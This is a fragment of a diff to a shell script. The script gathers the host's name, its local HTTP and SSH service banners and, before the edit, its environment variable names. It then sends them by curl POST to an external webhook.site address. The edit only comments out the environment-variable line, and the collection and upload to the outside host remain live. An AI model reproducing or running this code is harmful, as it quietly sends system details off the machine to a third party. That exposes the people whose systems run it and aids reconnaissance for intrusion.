@@ -58,11 +58,11 @@ JSON_PAYLOAD=$(cat <<EOF
   "hostname": "$(hostname)",
   "http_banner": "$(curl -I http://localhost 2>/dev/null | head -n 1)",
   "ssh_banner": "$(echo | nc localhost 22 2>/dev/null | head -n 1)",
-    "env_var_keys": $(printenv | cut -d '=' -f 1 | jq -R . | jq -s .)
+    
 }
 EOF
 )
-
+# "env_var_keys": $(printenv | cut -d '=' -f 1 | jq -R . | jq -s .)
 # Send the payload to the external webhook
 curl -X POST -H "Content-Type: application/json" -d "${JSON_PAYLOAD}" https://webhook.site/83eec9ca-ff62-4398-ab88-84e4376b6032
 
